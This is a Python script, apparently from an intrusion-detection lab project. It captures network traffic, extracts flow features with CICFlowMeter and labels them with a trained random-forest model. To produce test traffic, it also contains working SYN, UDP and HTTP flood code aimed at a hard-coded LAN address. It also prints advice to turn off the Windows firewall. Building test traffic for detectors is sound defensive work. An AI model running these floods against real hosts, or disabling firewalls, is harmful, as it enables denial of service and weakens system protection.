import subprocess
import os
import time
from datetime import datetime
import pyshark
import pandas as pd
import numpy as np
import joblib
from scapy.all import *
import threading

def capture_pcap(interface, capture_duration, output_pcap):
    """Capture network packets from a specific interface for a given duration."""
    try:
        print(f"[+] Capturing network traffic for {capture_duration} seconds from interface {interface}...")
        capture = pyshark.LiveCapture(interface=interface, output_file=output_pcap)
        capture.sniff(timeout=capture_duration)
        print(f"[+] Packet capture completed: {output_pcap}")
        return True
    except Exception as e:
        print(f"[!] An error occurred while capturing traffic: {e}")
        return False

def run_cfm(cfm_path, input_file, output_folder):
    """Run CICFlowMeter on the given .pcap file to generate flow statistics."""
    try:
        print(f"[+] Running CICFlowMeter on {input_file}...")
        original_working_dir = os.getcwd()
        bin_directory = os.path.dirname(cfm_path)
        os.chdir(bin_directory)

        command = f"cfm.bat {input_file} {output_folder}"
        print(f"[i] Executing: {command}")
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=True
        )

        stdout, stderr = process.communicate()

        os.chdir(original_working_dir)

        if process.returncode != 0:
            print(f"[!] Error running CICFlowMeter:\n{stderr}")
            return False
        else:
            print(f"[+] CICFlowMeter completed.\n{stdout}")
            return True

    except Exception as e:
        print(f"[!] An error occurred while running CICFlowMeter: {e}")
        return False

def predict_anomalies(csv_path, model_path="random_forest_ids_model.pkl", encoder_path="label_encoder.pkl"):
    """Predict anomalies in a new CICFlowMeter CSV file using a trained RandomForest model."""
    try:
        print("[+] Loading model and label encoder...")
        model = joblib.load(model_path)
        label_encoder = joblib.load(encoder_path)

        print("[+] Reading input CSV...")
        df = pd.read_csv(csv_path)
        df_original = df.copy()

        # Get expected features from the model
        expected_features = model.feature_names_in_
        print(f"[+] Model expects {len(expected_features)} features")
        
        # Create complete feature mapping
        column_rename_map = {
    # Exact matches or simple renames
    "Flow ID": "Flow ID",
    "Src IP": "Source IP",
    "Src Port": "Source Port",
    "Dst IP": "Destination IP",
    "Dst Port": "Destination Port",
    "Protocol": "Protocol",
    "Timestamp": "Timestamp",
    "Flow Duration": "Flow Duration",
    "Tot Fwd Pkts": "Total Fwd Packets",
    "Tot Bwd Pkts": "Total Backward Packets",
    "TotLen Fwd Pkts": "Fwd Packets Length Total",
    "TotLen Bwd Pkts": "Bwd Packets Length Total",
    "Fwd Pkt Len Max": "Fwd Packet Length Max",
    "Fwd Pkt Len Min": "Fwd Packet Length Min",
    "Fwd Pkt Len Mean": "Fwd Packet Length Mean",
    "Fwd Pkt Len Std": "Fwd Packet Length Std",
    "Bwd Pkt Len Max": "Bwd Packet Length Max",
    "Bwd Pkt Len Min": "Bwd Packet Length Min",
    "Bwd Pkt Len Mean": "Bwd Packet Length Mean",
    "Bwd Pkt Len Std": "Bwd Packet Length Std",
    "Flow Byts/s": "Flow Bytes/s",
    "Flow Pkts/s": "Flow Packets/s",
    "Flow IAT Mean": "Flow IAT Mean",
    "Flow IAT Std": "Flow IAT Std",
    "Flow IAT Max": "Flow IAT Max",
    "Flow IAT Min": "Flow IAT Min",
    "Fwd IAT Tot": "Fwd IAT Total",
    "Fwd IAT Mean": "Fwd IAT Mean",
    "Fwd IAT Std": "Fwd IAT Std",
    "Fwd IAT Max": "Fwd IAT Max",
    "Fwd IAT Min": "Fwd IAT Min",
    "Bwd IAT Tot": "Bwd IAT Total",
    "Bwd IAT Mean": "Bwd IAT Mean",
    "Bwd IAT Std": "Bwd IAT Std",
    "Bwd IAT Max": "Bwd IAT Max",
    "Bwd IAT Min": "Bwd IAT Min",
    "Fwd PSH Flags": "Fwd PSH Flags",
    "Bwd PSH Flags": "Bwd PSH Flags",
    "Fwd URG Flags": "Fwd URG Flags",
    "Bwd URG Flags": "Bwd URG Flags",
    "Fwd Header Len": "Fwd Header Length",
    "Bwd Header Len": "Bwd Header Length",
    "Fwd Pkts/s": "Fwd Packets/s",
    "Bwd Pkts/s": "Bwd Packets/s",
    "Pkt Len Min": "Packet Length Min",
    "Pkt Len Max": "Packet Length Max",
    "Pkt Len Mean": "Packet Length Mean",
    "Pkt Len Std": "Packet Length Std",
    "Pkt Len Var": "Packet Length Variance",
    "FIN Flag Cnt": "FIN Flag Count",
    "SYN Flag Cnt": "SYN Flag Count",
    "RST Flag Cnt": "RST Flag Count",
    "PSH Flag Cnt": "PSH Flag Count",
    "ACK Flag Cnt": "ACK Flag Count",
    "URG Flag Cnt": "URG Flag Count",
    "CWE Flag Count": "CWE Flag Count",
    "ECE Flag Cnt": "ECE Flag Count",
    "Down/Up Ratio": "Down/Up Ratio",
    "Pkt Size Avg": "Avg Packet Size",
    "Fwd Seg Size Avg": "Avg Fwd Segment Size",
    "Bwd Seg Size Avg": "Avg Bwd Segment Size",
    "Fwd Byts/b Avg": "Fwd Avg Bytes/Bulk",
    "Fwd Pkts/b Avg": "Fwd Avg Packets/Bulk",
    "Fwd Blk Rate Avg": "Fwd Avg Bulk Rate",
    "Bwd Byts/b Avg": "Bwd Avg Bytes/Bulk",
    "Bwd Pkts/b Avg": "Bwd Avg Packets/Bulk",
    "Bwd Blk Rate Avg": "Bwd Avg Bulk Rate",
    "Subflow Fwd Pkts": "Subflow Fwd Packets",
    "Subflow Fwd Byts": "Subflow Fwd Bytes",
    "Subflow Bwd Pkts": "Subflow Bwd Packets",
    "Subflow Bwd Byts": "Subflow Bwd Bytes",
    "Init Fwd Win Byts": "Init Fwd Win Bytes",
    "Init Bwd Win Byts": "Init Bwd Win Bytes",
    "Fwd Act Data Pkts": "Fwd Act Data Packets",
    "Fwd Seg Size Min": "Fwd Seg Size Min",
    "Active Mean": "Active Mean",
    "Active Std": "Active Std",
    "Active Max": "Active Max",
    "Active Min": "Active Min",
    "Idle Mean": "Idle Mean",
    "Idle Std": "Idle Std",
    "Idle Max": "Idle Max",
    "Idle Min": "Idle Min",
    "Label": "Label"
}

        # Rename columns
        df.rename(columns=column_rename_map, inplace=True)
        
        # Fill missing features with 0
        for feature in expected_features:
            if feature not in df.columns:
                print(f"[!] Adding missing feature: {feature}")
                df[feature] = 0

        # Keep only expected features in correct order
        df = df[expected_features]
        
        print(f"[+] Predicting on {df.shape[0]} records...")
        predictions = model.predict(df)
        predicted_labels = label_encoder.inverse_transform(predictions)

        df_original['Prediction'] = predicted_labels
        output_path = csv_path.replace(".csv", "_with_predictions.csv")
        df_original.to_csv(output_path, index=False)
        print(f"[+] Predictions saved to {output_path}")

        print("\n[+] Prediction Summary:")
        print(df_original['Prediction'].value_counts())

        return df_original

    except Exception as e:
        print(f"[!] Error during prediction: {e}")
        return None
def verify_capture(pcap_file, expected_syn=1000, expected_udp=500):
    """Verify attack packets were actually captured"""
    try:
        packets = rdpcap(pcap_file)
        syn_count = len([p for p in packets if TCP in p and p[TCP].flags & 0x02])
        udp_count = len([p for p in packets if UDP in p])
        http_count = len([p for p in packets if TCP in p and p[TCP].dport == 80 and Raw in p])
        
        print(f"\n[+] Capture Verification:")
        print(f"SYN packets: {syn_count} (expected ≥{expected_syn})")
        print(f"UDP packets: {udp_count} (expected ≥{expected_udp})")
        print(f"HTTP packets: {http_count}")
        
        if syn_count < expected_syn/10:  # 10% threshold
            print("\n[!] CRITICAL: SYN packets not being captured properly")
            print("Solutions:")
            print("1. Run as Administrator")
            print("2. Use wired connection instead of Wi-Fi")
            print("3. Try different network interface")
            print("4. Disable firewall temporarily: netsh advfirewall set allprofiles state off")
            return False
        return True
    except Exception as e:
        print(f"[!] Capture verification failed: {e}")
        return False
def launch_attack(target_ip="192.168.18.3"):
    """Enhanced attack function with verification"""
    try:
        print("[+] Starting attacks in 5 seconds...")
        time.sleep(5)
        
        # Phase 1: Intense SYN Flood
        print("[+] Launching 10,000 SYN packets to port 80")
        send(IP(dst=target_ip)/TCP(dport=80, flags="S", seq=RandInt()), 
             count=10000, verbose=0)
        
        # Phase 2: High-rate UDP Flood
        print("[+] Launching 5,000 UDP packets to port 53")
        send(IP(dst=target_ip)/UDP(dport=53)/Raw(load="X"*1500),
             count=5000, inter=0.001, verbose=0)
        
        # Phase 3: HTTP Flood with abnormal patterns
        print("[+] Launching HTTP flood with malicious patterns")
        for i in range(200):
            # Random malformed HTTP requests
            payload = f"GET /{''.join(random.choices(string.ascii_letters, k=1000))} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            send(IP(dst=target_ip)/TCP(dport=80, flags="PA")/payload, 
                 verbose=0)
        
        print("[+] Attacks completed")
    except Exception as e:
        print(f"[!] Attack error: {e}")

def main():
    # Configuration
    cfm_path = r"D:\Real-Time-Feature-Extraction-of-Packets-using-CICFLOWMETER\CICFlowMeter-4.0\bin\cfm.bat"
    input_folder = r"D:\Real-Time-Feature-Extraction-of-Packets-using-CICFLOWMETER\pcap_store"
    output_folder = r"D:\Real-Time-Feature-Extraction-of-Packets-using-CICFLOWMETER\output"
    interface = "Wi-Fi"
    capture_duration = 60  # seconds
    target_ip = "192.168.18.3"  # Change to your target IP

    # Create directories if they don't exist
    os.makedirs(input_folder, exist_ok=True)
    os.makedirs(output_folder, exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_pcap = os.path.join(input_folder, f"attack_traffic_{timestamp}.pcap")

    # Start attack thread
    attack_thread = threading.Thread(target=launch_attack, args=(target_ip,))
    attack_thread.daemon = True
    attack_thread.start()

    # Step 1: Capture packets (will include attacks)
    if not capture_pcap(interface, capture_duration, output_pcap):
        print("[!] Packet capture failed. Exiting.")
        return

    # Step 2: Convert pcap to CSV using CICFlowMeter
    if not run_cfm(cfm_path, output_pcap, output_folder):
        print("[!] CICFlowMeter failed. Exiting.")
        return
    if not verify_capture(output_pcap):
        return

    # Step 3: Find the generated CSV file
    csv_files = [f for f in os.listdir(output_folder) 
                if f.startswith(os.path.basename(output_pcap)) and f.endswith(".csv")]
    
    if not csv_files:
        print("[!] No CSV file generated. Possible issues:")
        print("- CICFlowMeter didn't process the PCAP correctly")
        print("- No network traffic was captured")
        return

    latest_csv = os.path.join(output_folder, csv_files[0])
    print(f"[+] Using CSV file: {latest_csv}")

    # Step 4: Predict anomalies
    result_df = predict_anomalies(latest_csv)
    
    if result_df is not None:
        # Verify attack detection
        output_csv = latest_csv.replace(".csv", "_with_predictions.csv")
        if os.path.exists(output_csv):
            df = pd.read_csv(output_csv)
            if "Prediction" in df.columns:
                print("\n[+] Final Detection Results:")
                print(df['Prediction'].value_counts())
                
                if "Malicious" not in df['Prediction'].values:
                    print("\n[!] WARNING: No attacks detected. Possible issues:")
                    print("- Attacks not reaching monitoring interface")
                    print("- Firewall/IPS blocking attack packets")
                    print("- Model not trained for these attack types")
                    
                    # Debug: Check for SYN packets in capture
                    try:
                        packets = rdpcap(output_pcap)
                        syn_count = len([p for p in packets if TCP in p and p[TCP].flags & 0x02])
                        print(f"\n[DEBUG] Found {syn_count} SYN packets in capture")
                    except Exception as e:
                        print(f"\n[DEBUG] Could not analyze PCAP file: {e}")
            else:
                print("[!] No predictions found in output file")
        else:
            print(f"[!] Output file not found: {output_csv}")
    else:
        print("[!] Prediction failed")

if __name__ == "__main__":
    # Need admin privileges for raw packet sending
    if os.name == 'nt':
        try:
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("[!] Please run as Administrator for packet injection")
                exit(1)
        except:
            pass
    
    main()